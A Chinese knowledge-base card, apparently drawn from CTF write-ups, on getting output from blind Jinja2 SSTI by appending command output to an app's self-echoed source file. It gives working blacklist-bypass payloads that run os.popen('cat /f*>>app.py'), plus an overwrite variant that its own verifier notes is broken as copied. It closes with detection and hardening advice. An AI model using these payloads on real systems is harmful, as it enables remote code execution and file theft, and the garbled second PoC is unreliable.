---
id: web-generic-ssti-no-echo-append-source-route-readback
title: 无回显 SSTI 的输出通道：把命令结果追加进「被源码路由回显」的文件，再由页面读回
type: scenario
domain: web
path: web/generic/ssti
technique: ssti-blind-output-via-append-to-echoed-source
tags:
- web
- ssti
- jinja2
- blind
- file-write
- blacklist-bypass
- exfiltration
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:42:21+08:00'
  notes: 已对照原文核对；本次核对未读取图片；黑名单列表、render_template_string 只 print 到 stdout 而 HTTP 返回 ok/error、GET / 用 open(__file__)+html.escape 回显源码、set 拼 globals/builtins/import 与 so 反转和相邻字面量 popen、cat 重定向写 app.py 后读回，均与正文一致。问题：卡内覆盖式 PoC 照抄原文残缺 payload（cycler.next[gl][bu]im 缺下标、空串乘 2），照原样不可用，应修正或标注原文有误；且与既有 web-python-ssti-jinja2-noecho-flag-write-into-source 同链（另一篇同题 writeup 产出的同黑名单、同源码回显端点、同追加重定向），本卡独有内容仅为 set 变量化写法，建议合并或加互链。
url: /docs/web/generic/ssti/web-generic-ssti-no-echo-append-source-route-readback/
draft: false
kb_aliases:
- SSTI 无回显取结果
- cat f* >> app.py 回显
- 追加写入源码文件读回
- 弱黑名单 SSTI 写文件回显
- 沙箱内写文件当出口
---

## 一句话结论

当 SSTI 的渲染结果被丢弃（只返回 `ok`）而无法回显时，不必找带外通道：只要应用存在"把某个文件内容读出来打印"的路由（典型是 GET `/` 打印自身源码），就能用 SSTI 里的命令执行把命令输出**重定向/追加**进那个文件（如 `cat /f* >> app.py`），再访问该路由把结果读回来。

## 原理

- 无回显 SSTI 的困难不在执行，而在观测：`render_template_string(...)` 的返回值被 `print` 到 stdout 或被丢弃，HTTP 响应固定为 `ok`。
- 但同一应用往往自带一个"自省"视图：`/` 用 `open(__file__).read()` 把源码 HTML 转义后输出。这实际上是一个把"进程内某个文件的内容"反射到 HTTP 的出口，等于攻击者可以写入、然后读回的暂存区。
- 于是利用方式变成一句话：用模板里的命令执行 + shell 重定向，把命令输出写到那个文件上；`>>` 追加而不是 `>` 覆盖，可以避免把应用源码整体毁掉导致路由失效。
- 覆盖式变体：用 `>` 把首页源码整个换成 `ls /` 的输出，访问 `/` 就只看到命令结果（简单直接，但会破坏应用，只适合一次性取数）。
- 为什么常常能写：这类靶场/题目以 root 或应用用户运行，源码目录可写；生产环境若部署目录只读，则本条退化为"找一个可写且会被回显的文件"（日志、模板、静态资源清单）。
- 前提仍是拿到执行能力：本例黑名单只匹配 `__`、`import`、`os`、`sys`、`eval`、`subprocess`、`popen`、`system` 这些子串，可以用 Jinja2 的 `{% set %}` 变量 + 字符串拼接/切片绕开字面量，例如 `'_'*2+'globals'+'_'*2`、`'so'[::-1]`、`'p''open'`。

## 触发条件

- 存在 SSTI（用户输入进入模板并被渲染），且渲染结果不回显。
- 应用有一个会读取文件内容并输出的路由（打印源码、读模板、看日志、下载静态清单等），且该文件进程可写。
- 黑名单只做子串匹配，`__`/`os`/`popen` 等关键字可用拼接、切片、`{% set %}` 变量构造。
- 进程对目标文件所在目录有写权限（容器/靶场常见；只读根文件系统则失效）。

## 利用步骤

1. 确认注入点与过滤：提交 `{{7*7}}` 之类看响应（可能只有 `ok`），再逐个试黑名单关键字判断过滤范围。
2. 找输出通道：访问 `/`、`/src`、`/debug`、`/download`，看是否有把源码或文件内容打印出来的路由。
3. 用 `{% set %}` 拼出 `__globals__`、`__builtins__`、`__import__`，取 `os.popen` 执行 `cat /f* >> app.py`（追加）。
4. 重新访问 `/`，在源码页面里找到追加在末尾的命令输出。
5. 若需要多次交互，改用内存马（钩子/错误处理器）建立带参数的命令通道，避免反复写文件破坏应用。

## PoC

```jinja
{# 黑名单为 __ / import / os / sys / eval / subprocess / popen / system / \r / \n 时的构造 #}
{% set gl='_'*2+'globals'+'_'*2 %}{% set bu='_'*2+'builtins'+'_'*2 %}{% set im='_'*2+'i''mport'+'_'*2 %}{% set hc='so'[::-1] %}{{g.pop[gl][bu][im](hc)['p''open']('cat /f*>>app.py').read()}}
```

```jinja
{# 覆盖式：把首页源码整体替换为命令输出 #}
{% set gl=''*2+'globals'+''*2 %}{% set bu=''*2+'builtins'+''*2 %}{% set im=''*2+'i''mport'+''*2 %}{% set mx='so'[::-1] %}{{cycler.next[gl][bu]im'p''open'('ls />>app.py').read()}}
```

```python
# 被利用的"回显"路由形态
@app.route('/', methods=["GET"])
def source():
    with open(__file__, 'r', encoding='utf-8') as f:
        return '<pre>' + html.escape(f.read()) + '</pre>'
```

## 变体与关联

- 变体（出口不同）：日志文件（`/var/log/...` 有查看接口）、模板文件（覆盖后下次渲染即执行）、静态 JSON 清单、`/download` 类接口。
- 变体（不写文件）：`{% print %}` 标签、把结果塞进异常消息（错误页回显）、布尔/时间盲注逐字符取数。
- 变体（清空 WAF 再打）：同类题常用递归合并类污染把应用内的 WAF 变量置空，再发完整 payload。
- 关联：[[web-generic-ssti-waf-string-concat-eq-globals-bypass]]（关键字拆分只解决"过过滤"，本条解决"看不见结果"）、[[web-python-deserialization-pickle-builtins-open-read-write-echo-bypass]]（pickle 场景下同样的"写回被回显的源码文件"通道）、[[web-python-framework-flask-hook-registry-memshell]]（建立可交互通道的下一步）。
- 边界：根文件系统只读、或没有任何读文件回显路由时失效；覆盖式写入会把应用打挂，取数后需要恢复。

## 检测与防御

- 修复：禁止把用户输入交给 `render_template_string`/`eval`；模板使用沙箱与属性白名单。
- 加固：生产环境代码目录只读挂载（容器 `readOnlyRootFilesystem`），应用不以 root 运行；不要提供"打印自身源码"的调试路由。
- 检测：模板参数出现 `{% set`、`'so'[::-1]`、`'p''open'`、`>>` 等拼接/重定向特征；源码文件被非部署流程修改（mtime 变化、内容尾部出现命令输出）；`/` 响应体突然包含 `ls`/`id`/flag 特征。
- 审计：搜索 `render_template_string`、`Template(`、`from_string` 的调用点，确认参数来源；检查是否存在 `open(__file__)` 类自省路由。
